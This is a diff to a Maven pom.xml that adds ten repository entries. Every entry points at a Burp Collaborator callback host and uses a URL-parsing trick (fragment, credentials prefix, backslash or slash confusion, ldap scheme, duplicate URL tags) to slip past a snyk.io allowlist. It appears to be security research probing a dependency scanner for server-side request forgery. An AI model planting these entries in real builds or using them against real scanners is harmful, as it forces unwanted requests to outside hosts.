@@ -18,9 +18,57 @@
 	</properties>
 
 <repositories>
-   <repository>
+    <repository>
+       <!-- vanilla -->
        <id>org.source.repo</id>
-       <url>http://maven.google.com.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
+       <url>http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/vanilla</url>
+   </repository>
+   <repository>
+       <!-- duplicate a -->
+       <id>org.source.repo</id>
+       <url>http://snyk.io</url>
+       <url>http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/duplicate-a</url>
+   </repository>
+   <repository>
+       <!-- duplicate b -->
+       <id>org.source.repo</id>
+       <url>http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/duplicate-b</url>
+       <url>http://snyk.io/</url>
+   </repository>
+   <repository>
+       <!-- fragment -->
+       <id>org.source.repo</id>
+       <url>http://snyk.io#v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/fragment</url>
+   </repository>
+   <repository>
+       <!-- scheme confusion -->
+       <id>org.source.repo</id>
+       <url>ldap://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/ldap-scheme</url>
+   </repository>
+   <repository>
+       <!-- slash confusion -->
+       <id>org.source.repo</id>
+       <url>http:///v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/s-confusion</url>
+   </repository>
+   <repository>
+       <!-- backslash confusion -->
+       <id>org.source.repo</id>
+       <url>http:\\v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/bs-confusion</url>
+   </repository>
+   <repository>
+       <!--  credentials -->
+       <id>org.source.repo</id>
+       <url>http://snyk.io@v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/creds</url>
+   </repository>
+   <repository>
+       <!--  credentials redux -->
+       <id>org.source.repo</id>
+       <url>http://snyk.io\@v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/creds2</url>
+   </repository>
+   <repository>
+       <!-- scheme omitted  -->
+       <id>org.source.repo</id>
+       <url>v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
    </repository>
 </repositories>
 
